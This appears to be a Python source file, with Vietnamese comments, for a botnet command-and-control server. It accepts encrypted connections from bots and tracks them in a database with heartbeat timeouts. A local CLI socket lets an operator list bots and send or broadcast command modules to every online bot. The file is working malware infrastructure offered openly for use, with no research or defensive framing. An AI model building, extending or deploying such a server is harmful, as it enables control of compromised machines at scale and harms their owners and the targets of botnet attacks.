"""
CNC Server chính — lắng nghe kết nối từ bot qua TLS/TCP.

Dùng asyncio để xử lý hàng trăm kết nối đồng thời.
"""

import argparse
import asyncio
import logging
import os
import signal
import ssl
import sys

import yaml

from server.commands import CommandQueue
from server.db import Database
from server.handler import handle_bot
from shared.crypto import AESCrypto

logger = logging.getLogger(__name__)

# Global reference để signal handler có thể gọi stop()
_server_instance: "CNCServer | None" = None


class CNCServer:
    def __init__(self, config: dict):
        self.config = config
        self._db = Database(config.get("database", {}).get("path", "cnc.db"))
        self._cmd_queue = CommandQueue()
        self._crypto: AESCrypto | None = None
        self._server: asyncio.Server | None = None
        self._tasks: list[asyncio.Task] = []
        self._running = False

    async def start(self):
        self._running = True
        self._stop_event = asyncio.Event()

        # Crypto
        key_hex = self.config["crypto"]["key"]
        key = bytes.fromhex(key_hex)
        self._crypto = AESCrypto(key)

        # Database
        await self._db.connect()

        # TLS context
        tls_cert = self.config.get("server", {}).get("tls_cert", "")
        tls_key = self.config.get("server", {}).get("tls_key", "")
        ssl_ctx = None
        if tls_cert and tls_key and os.path.exists(tls_cert) and os.path.exists(tls_key):
            ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_ctx.load_cert_chain(tls_cert, tls_key)
            logger.info("TLS enabled: %s", tls_cert)
        else:
            logger.warning("TLS disabled — cert/key not found. Generate with scripts/generate_certs.sh")

        # Start server
        host = self.config.get("server", {}).get("host", "0.0.0.0")
        port = self.config.get("server", {}).get("port", 8443)

        self._server = await asyncio.start_server(
            lambda r, w: handle_bot(r, w, self._crypto, self._db, self._cmd_queue),
            host, port,
            ssl=ssl_ctx,
        )
        logger.info("CNC Server listening on %s:%s", host, port)

        # Background tasks
        self._tasks.append(asyncio.create_task(self._heartbeat_checker()))
        self._tasks.append(asyncio.create_task(self._nonce_cleanup()))

        # CLI socket
        cli_host = self.config.get("server", {}).get("cli_host", "127.0.0.1")
        cli_port = self.config.get("server", {}).get("cli_port", 8444)
        self._tasks.append(asyncio.create_task(self._cli_listener(cli_host, cli_port)))

        # Signal handlers
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                asyncio.get_event_loop().add_signal_handler(sig, self._handle_signal)
            except NotImplementedError:
                signal.signal(sig, self._sync_signal_handler)

        await self._stop_event.wait()

    async def stop(self):
        logger.info("Shutting down...")
        self._running = False

        for task in self._tasks:
            task.cancel()
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()

        if self._server:
            self._server.close()
            await self._server.wait_closed()

        await self._db.close()
        self._stop_event.set()
        logger.info("CNC Server stopped")

    async def _heartbeat_checker(self):
        while self._running:
            try:
                timeout = self.config.get("heartbeat", {}).get("timeout", 90)
                offline_bots = await self._db.get_offline_bots(timeout)
                for bot in offline_bots:
                    logger.info("Bot %s marked offline (heartbeat timeout)", bot["bot_id"])
                    await self._db.mark_bot_offline(bot["bot_id"])
            except Exception:
                logger.exception("Heartbeat checker error")
            await asyncio.sleep(30)

    async def _nonce_cleanup(self):
        while self._running:
            try:
                await self._db.cleanup_old_nonces()
            except Exception:
                pass
            await asyncio.sleep(300)

    async def _cli_listener(self, host: str, port: int):
        """Lắng nghe lệnh từ CLI qua TCP."""
        try:
            server = await asyncio.start_server(
                lambda r, w: _handle_cli(r, w, self), host, port
            )
            async with server:
                await server.serve_forever()
        except Exception:
            logger.exception("CLI listener error")

    def _handle_signal(self):
        asyncio.create_task(self.stop())

    @staticmethod
    def _sync_signal_handler(signum, frame):
        logger.info("Received signal %d, shutting down", signum)
        sys.exit(0)


async def _handle_cli(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                      cnc: CNCServer):
    """Xử lý connection từ CLI tool."""
    import json

    async def send(obj):
        writer.write((json.dumps(obj) + "\n").encode())
        await writer.drain()

    async def recv():
        line = await reader.readline()
        if not line:
            return None
        return json.loads(line.decode().strip())

    while cnc._running:
        try:
            req = await recv()
        except Exception:
            break
        if req is None:
            break

        action = req.get("action", "")

        if action == "bots_list":
            bots = await cnc._db.list_bots()
            await send({"ok": True, "data": bots})

        elif action == "bots_count":
            counts = await cnc._db.count_bots()
            await send({"ok": True, "data": counts})

        elif action == "bot_info":
            bot_id = req.get("bot_id", "")
            bot = await cnc._db.get_bot(bot_id)
            if not bot:
                # try by db id
                try:
                    bot = await cnc._db.get_bot_by_db_id(int(bot_id))
                except ValueError:
                    pass
            if bot:
                await send({"ok": True, "data": bot})
            else:
                await send({"ok": False, "error": "Bot not found"})

        elif action == "cmd_send":
            bot_id = req.get("bot_id", "")
            module = req.get("module", "")
            params = req.get("params", {})
            cmd_id = cnc._cmd_queue.enqueue(bot_id, module, params)
            await send({"ok": True, "cmd_id": cmd_id})

        elif action == "cmd_broadcast":
            module = req.get("module", "")
            params = req.get("params", {})
            bots = await cnc._db.list_bots()
            online_bot_ids = [b["bot_id"] for b in bots if b["status"] == "online"]
            results = cnc._cmd_queue.enqueue_all(online_bot_ids, module, params)
            await send({"ok": True, "sent_to": len(results), "bot_ids": [bid for bid, _ in results]})

        elif action == "cmd_status":
            cmd_id = req.get("cmd_id", "")
            cmd = await cnc._db.get_command(cmd_id)
            if cmd:
                await send({"ok": True, "data": cmd})
            else:
                await send({"ok": False, "error": "Command not found"})

        elif action == "ping":
            await send({"ok": True})

        else:
            await send({"ok": False, "error": f"Unknown action: {action}"})

    writer.close()
    await writer.wait_closed()


def main():
    parser = argparse.ArgumentParser(description="CNC Server")
    parser.add_argument("--config", "-c", default="config.yaml", help="Path to config file")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    if not os.path.exists(args.config):
        logger.error("Config file not found: %s", args.config)
        sys.exit(1)

    with open(args.config) as f:
        config = yaml.safe_load(f)

    global _server_instance
    _server_instance = CNCServer(config)

    try:
        asyncio.run(_server_instance.start())
    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt received")


if __name__ == "__main__":
    main()
